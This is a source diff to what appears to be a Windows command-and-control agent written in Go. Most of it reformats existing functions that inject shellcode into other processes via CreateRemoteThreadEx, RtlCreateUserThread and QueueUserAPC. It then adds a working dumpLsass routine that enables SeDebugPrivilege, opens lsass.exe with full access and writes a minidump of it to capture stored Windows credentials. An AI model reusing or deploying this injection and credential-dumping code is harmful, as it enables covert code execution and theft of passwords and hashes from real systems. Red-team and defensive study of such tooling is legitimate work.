@@ -23,6 +23,8 @@ import (
 	// Standard
 	"errors"
 	"fmt"
+	"io/ioutil"
+	"os"
 	"os/exec"
 	"syscall"
 	"unsafe"
@@ -36,37 +38,37 @@ import (
 
 const (
 	// MEM_COMMIT is a Windows constant used with Windows API calls
-	MEM_COMMIT             	= 0x1000
+	MEM_COMMIT = 0x1000
 	// MEM_RESERVE is a Windows constant used with Windows API calls
-	MEM_RESERVE            	= 0x2000
+	MEM_RESERVE = 0x2000
 	// MEM_RELEASE is a Windows constant used with Windows API calls
-	MEM_RELEASE 			= 0x8000
+	MEM_RELEASE = 0x8000
 	// PAGE_EXECUTE is a Windows constant used with Windows API calls
-	PAGE_EXECUTE 			= 0x10
+	PAGE_EXECUTE = 0x10
 	// PAGE_EXECUTE_READWRITE is a Windows constant used with Windows API calls
-	PAGE_EXECUTE_READWRITE 	= 0x40
+	PAGE_EXECUTE_READWRITE = 0x40
 	// PAGE_READWRITE is a Windows constant used with Windows API calls
-	PAGE_READWRITE 			= 0x04
+	PAGE_READWRITE = 0x04
 	// PROCESS_CREATE_THREAD is a Windows constant used with Windows API calls
-	PROCESS_CREATE_THREAD 	= 0x0002
+	PROCESS_CREATE_THREAD = 0x0002
 	// PROCESS_VM_READ is a Windows constant used with Windows API calls
-	PROCESS_VM_READ 		= 0x0010
+	PROCESS_VM_READ = 0x0010
 	//PROCESS_VM_WRITE is a Windows constant used with Windows API calls
-	PROCESS_VM_WRITE 		= 0x0020
+	PROCESS_VM_WRITE = 0x0020
 	// PROCESS_VM_OPERATION is a Windows constant used with Windows API calls
-	PROCESS_VM_OPERATION 	= 0x0008
+	PROCESS_VM_OPERATION = 0x0008
 	// PROCESS_QUERY_INFORMATION is a Windows constant used with Windows API calls
 	PROCESS_QUERY_INFORMATION = 0x0400
 	// TH32CS_SNAPHEAPLIST is a Windows constant used with Windows API calls
-	TH32CS_SNAPHEAPLIST		= 0x00000001
+	TH32CS_SNAPHEAPLIST = 0x00000001
 	// TH32CS_SNAPMODULE is a Windows constant used with Windows API calls
-	TH32CS_SNAPMODULE		= 0x00000008
+	TH32CS_SNAPMODULE = 0x00000008
 	// TH32CS_SNAPPROCESS is a Windows constant used with Windows API calls
-	TH32CS_SNAPPROCESS		= 0x00000002
+	TH32CS_SNAPPROCESS = 0x00000002
 	// TH32CS_SNAPTHREAD is a Windows constant used with Windows API calls
-	TH32CS_SNAPTHREAD		= 0x00000004
+	TH32CS_SNAPTHREAD = 0x00000004
 	// THREAD_SET_CONTEXT is a Windows constant used with Windows API calls
-	THREAD_SET_CONTEXT 		= 0x0010
+	THREAD_SET_CONTEXT = 0x0010
 )
 
 // ExecuteCommand is function used to instruct an agent to execute a command on the host operating system
@@ -105,7 +107,7 @@ func ExecuteShellcodeSelf(shellcode []byte) error {
 
 	addr, _, errVirtualAlloc := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
 
-	if errVirtualAlloc.Error() != "The operation completed successfully."  {
+	if errVirtualAlloc.Error() != "The operation completed successfully." {
 		return errors.New("Error calling VirtualAlloc:\r\n" + errVirtualAlloc.Error())
 	}
 
@@ -119,10 +121,10 @@ func ExecuteShellcodeSelf(shellcode []byte) error {
 		return errors.New("Error calling RtlCopyMemory:\r\n" + errRtlCopyMemory.Error())
 	}
 	// TODO set initial memory allocation to rw and update to execute; currently getting "The parameter is incorrect."
-/*	_, _, errVirtualProtect := VirtualProtect.Call(uintptr(addr), uintptr(len(shellcode)), PAGE_EXECUTE)
-	if errVirtualProtect.Error() != "The operation completed successfully." {
-		return errVirtualProtect
-	}*/
+	/*	_, _, errVirtualProtect := VirtualProtect.Call(uintptr(addr), uintptr(len(shellcode)), PAGE_EXECUTE)
+		if errVirtualProtect.Error() != "The operation completed successfully." {
+			return errVirtualProtect
+		}*/
 
 	_, _, errSyscall := syscall.Syscall(addr, 0, 0, 0, 0)
 
@@ -149,9 +151,9 @@ func ExecuteShellcodeRemote(shellcode []byte, pid uint32) error {
 		return errors.New("Error calling OpenProcess:\r\n" + errOpenProcess.Error())
 	}
 
-	addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(pHandle),0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
+	addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(pHandle), 0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
 
-	if errVirtualAlloc.Error() != "The operation completed successfully."  {
+	if errVirtualAlloc.Error() != "The operation completed successfully." {
 		return errors.New("Error calling VirtualAlloc:\r\n" + errVirtualAlloc.Error())
 	}
 
@@ -170,7 +172,7 @@ func ExecuteShellcodeRemote(shellcode []byte, pid uint32) error {
 		return errors.New("Error calling VirtualProtectEx:\r\n" + errVirtualProtectEx.Error())
 	}
 
-	_, _, errCreateRemoteThreadEx := CreateRemoteThreadEx.Call(uintptr(pHandle), 0, 0, addr, 0,0,0)
+	_, _, errCreateRemoteThreadEx := CreateRemoteThreadEx.Call(uintptr(pHandle), 0, 0, addr, 0, 0, 0)
 	if errCreateRemoteThreadEx.Error() != "The operation completed successfully." {
 		return errors.New("Error calling CreateRemoteThreadEx:\r\n" + errCreateRemoteThreadEx.Error())
 	}
@@ -201,9 +203,9 @@ func ExecuteShellcodeRtlCreateUserThread(shellcode []byte, pid uint32) error {
 		return errors.New("Error calling OpenProcess:\r\n" + errOpenProcess.Error())
 	}
 
-	addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(pHandle),0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
+	addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(pHandle), 0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
 
-	if errVirtualAlloc.Error() != "The operation completed successfully."  {
+	if errVirtualAlloc.Error() != "The operation completed successfully." {
 		return errors.New("Error calling VirtualAlloc:\r\n" + errVirtualAlloc.Error())
 	}
 
@@ -223,23 +225,22 @@ func ExecuteShellcodeRtlCreateUserThread(shellcode []byte, pid uint32) error {
 	}
 
 	/*
-	NTSTATUS
-	RtlCreateUserThread(
-		IN HANDLE Process,
-		IN PSECURITY_DESCRIPTOR ThreadSecurityDescriptor OPTIONAL,
-		IN BOOLEAN CreateSuspended,
-		IN ULONG ZeroBits OPTIONAL,
-		IN SIZE_T MaximumStackSize OPTIONAL,
-		IN SIZE_T CommittedStackSize OPTIONAL,
-		IN PUSER_THREAD_START_ROUTINE StartAddress,
-		IN PVOID Parameter OPTIONAL,
-		OUT PHANDLE Thread OPTIONAL,
-		OUT PCLIENT_ID ClientId OPTIONAL
-		)
-	 */
+		NTSTATUS
+		RtlCreateUserThread(
+			IN HANDLE Process,
+			IN PSECURITY_DESCRIPTOR ThreadSecurityDescriptor OPTIONAL,
+			IN BOOLEAN CreateSuspended,
+			IN ULONG ZeroBits OPTIONAL,
+			IN SIZE_T MaximumStackSize OPTIONAL,
+			IN SIZE_T CommittedStackSize OPTIONAL,
+			IN PUSER_THREAD_START_ROUTINE StartAddress,
+			IN PVOID Parameter OPTIONAL,
+			OUT PHANDLE Thread OPTIONAL,
+			OUT PCLIENT_ID ClientId OPTIONAL
+			)
+	*/
 	var tHandle uintptr
-	_, _, errRtlCreateUserThread :=  RtlCreateUserThread.Call(uintptr(pHandle), 0, 0, 0, 0, 0, addr, 0, uintptr(unsafe.Pointer(&tHandle)), 0)
-
+	_, _, errRtlCreateUserThread := RtlCreateUserThread.Call(uintptr(pHandle), 0, 0, 0, 0, 0, addr, 0, uintptr(unsafe.Pointer(&tHandle)), 0)
 
 	if errRtlCreateUserThread.Error() != "The operation completed successfully." {
 		return errors.New("Error calling RtlCreateUserThread:\r\n" + errRtlCreateUserThread.Error())
@@ -283,14 +284,14 @@ func ExecuteShellcodeQueueUserAPC(shellcode []byte, pid uint32) error {
 	}
 	// TODO see if you can use just SNAPTHREAD
 	sHandle, _, errCreateToolhelp32Snapshot := CreateToolhelp32Snapshot.Call(TH32CS_SNAPHEAPLIST|TH32CS_SNAPMODULE|TH32CS_SNAPPROCESS|TH32CS_SNAPTHREAD, uintptr(pid))
-	if errCreateToolhelp32Snapshot.Error() != "The operation completed successfully."{
+	if errCreateToolhelp32Snapshot.Error() != "The operation completed successfully." {
 		return errors.New("Error calling CreateToolhelp32Snapshot:\r\n" + errCreateToolhelp32Snapshot.Error())
 	}
 
 	// TODO don't allocate/write memory unless there is a valid thread
-	addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(pHandle),0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
+	addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(pHandle), 0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
 
-	if errVirtualAlloc.Error() != "The operation completed successfully."  {
+	if errVirtualAlloc.Error() != "The operation completed successfully." {
 		return errors.New("Error calling VirtualAlloc:\r\n" + errVirtualAlloc.Error())
 	}
 
@@ -310,19 +311,19 @@ func ExecuteShellcodeQueueUserAPC(shellcode []byte, pid uint32) error {
 	}
 
 	type THREADENTRY32 struct {
-		dwSize				uint32
-		cntUsage			uint32
-		th32ThreadID		uint32
-		th32OwnerProcessID	uint32
-		tpBasePri			int32
-		tpDeltaPri			int32
-		dwFlags				uint32
+		dwSize             uint32
+		cntUsage           uint32
+		th32ThreadID       uint32
+		th32OwnerProcessID uint32
+		tpBasePri          int32
+		tpDeltaPri         int32
+		dwFlags            uint32
 	}
 	var t THREADENTRY32
 	t.dwSize = uint32(unsafe.Sizeof(t))
 
 	_, _, errThread32First := Thread32First.Call(uintptr(sHandle), uintptr(unsafe.Pointer(&t)))
-	if errThread32First.Error() != "The operation completed successfully."{
+	if errThread32First.Error() != "The operation completed successfully." {
 		return errors.New("Error calling Thread32First:\r\n" + errThread32First.Error())
 	}
 	i := true
@@ -357,7 +358,9 @@ func ExecuteShellcodeQueueUserAPC(shellcode []byte, pid uint32) error {
 				if errCloseHandle.Error() != "The operation completed successfully." {
 					return errors.New("Error calling thread CloseHandle:\r\n" + errCloseHandle.Error())
 				}
-			} else {x++}
+			} else {
+				x++
+			}
 		}
 
 	}
@@ -369,4 +372,159 @@ func ExecuteShellcodeQueueUserAPC(shellcode []byte, pid uint32) error {
 
 	return nil
 }
+
 // TODO always close handle during exception handling
+
+// dumpLsass will attempt to perform a minidumpwritedump operation on lsass.exe, and returns the raw bytes of the dumpfile
+func dumpLsass() ([]byte, error) {
+
+	ret := []byte{}
+
+	//get debug privs
+
+	err := sePrivEnable("SeDebugPrivilege")
+	if err != nil {
+		return ret, err
+	}
+	/*
+		BOOL MiniDumpWriteDump(
+		  HANDLE                            hProcess,
+		  DWORD                             ProcessId,
+		  HANDLE                            hFile,
+		  MINIDUMP_TYPE                     DumpType,
+		  PMINIDUMP_EXCEPTION_INFORMATION   ExceptionParam,
+		  PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,
+		  PMINIDUMP_CALLBACK_INFORMATION    CallbackParam
+		);
+	*/
+	//load up our minidump function
+	k32 := syscall.NewLazyDLL("Dbgcore.dll")
+	m := k32.NewProc("MiniDumpWriteDump")
+
+	//set up the tempfile to write to, automatically remove it once done
+	// TODO: Work out how to do this in memory
+	f, e := ioutil.TempFile(os.TempDir(), "")
+	if e != nil {
+		return ret, e
+	}
+	defer os.Remove(f.Name())
+	stdOutHandle := f.Fd()
+
+	//get our proc ID, and get a handle to the process
+	pid := getProcID("lsass.exe")
+	hProc, err := syscall.OpenProcess(0x1F0FFF, false, pid) //PROCESS_ALL_ACCESS := uint32(0x1F0FFF)
+	if err != nil {
+		return ret, err
+	}
+
+	// calls the minidump function
+	r, _, _ := m.Call(uintptr(hProc), uintptr(pid), stdOutHandle, 3, 0, 0, 0)
+
+	f.Close() //idk why this fixes the 'not same as on disk' issue, but it does
+
+	if r != 0 {
+		ret, err = ioutil.ReadFile(f.Name())
+		if err != nil {
+			return ret, err
+		}
+	}
+
+	return ret, nil
+}
+
+//getProcID returns the PID of the provided process name (eg lsass.exe). PID of < 1 indicates didn't find the process.
+func getProcID(procname string) uint32 {
+	//https://github.com/mitchellh/go-ps/blob/master/process_windows.go
+
+	handle, err := syscall.CreateToolhelp32Snapshot(
+		0x00000002,
+		0)
+	if handle < 0 {
+		return 0
+	}
+	defer syscall.CloseHandle(handle)
+
+	var entry syscall.ProcessEntry32
+	entry.Size = uint32(unsafe.Sizeof(entry))
+	err = syscall.Process32First(handle, &entry)
+	if err != nil {
+		fmt.Println(err)
+		return 0
+	}
+
+	for {
+		s := ""
+		for _, chr := range entry.ExeFile {
+			if chr != 0 {
+				s = s + string(int(chr))
+			}
+		}
+		if s == procname {
+			return entry.ProcessID
+		}
+		err = syscall.Process32Next(handle, &entry)
+		if err != nil {
+			break
+		}
+	}
+	return 0
+}
+
+//sePrivEnable adjusts the privileges of the current process to add the passed in string. Good for setting 'SeDebugPrivilege'
+func sePrivEnable(s string) error {
+	type LUID struct {
+		LowPart  uint32
+		HighPart int32
+	}
+	type LUID_AND_ATTRIBUTES struct {
+		Luid       LUID
+		Attributes uint32
+	}
+	type TOKEN_PRIVILEGES struct {
+		PrivilegeCount uint32
+		Privileges     [1]LUID_AND_ATTRIBUTES
+	}
+
+	modadvapi32 := syscall.NewLazyDLL("advapi32.dll")
+	procAdjustTokenPrivileges := modadvapi32.NewProc("AdjustTokenPrivileges")
+
+	procLookupPriv := modadvapi32.NewProc("LookupPrivilegeValueW")
+	var tokenHandle syscall.Token
+	thsHandle, err := syscall.GetCurrentProcess()
+	if err != nil {
+		return err
+	}
+	syscall.OpenProcessToken(
+		//r, a, e := procOpenProcessToken.Call(
+		thsHandle,                       //  HANDLE  ProcessHandle,
+		syscall.TOKEN_ADJUST_PRIVILEGES, //	DWORD   DesiredAccess,
+		&tokenHandle,                    //	PHANDLE TokenHandle
+	)
+	var luid LUID
+	r, _, e := procLookupPriv.Call(
+		uintptr(0), //LPCWSTR lpSystemName,
+		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(s))), //LPCWSTR lpName,
+		uintptr(unsafe.Pointer(&luid)),                       //PLUID   lpLuid
+	)
+	if r == 0 {
+		return e
+	}
+	SE_PRIVILEGE_ENABLED := uint32(0x00000002)
+	privs := TOKEN_PRIVILEGES{}
+	privs.PrivilegeCount = 1
+	privs.Privileges[0].Luid = luid
+	privs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
+	//AdjustTokenPrivileges(hToken, false, &priv, 0, 0, 0)
+	r, _, e = procAdjustTokenPrivileges.Call(
+		uintptr(tokenHandle),
+		uintptr(0),
+		uintptr(unsafe.Pointer(&privs)),
+		uintptr(0),
+		uintptr(0),
+		uintptr(0),
+	)
+	if r == 0 {
+		return e
+	}
+	return nil
+}
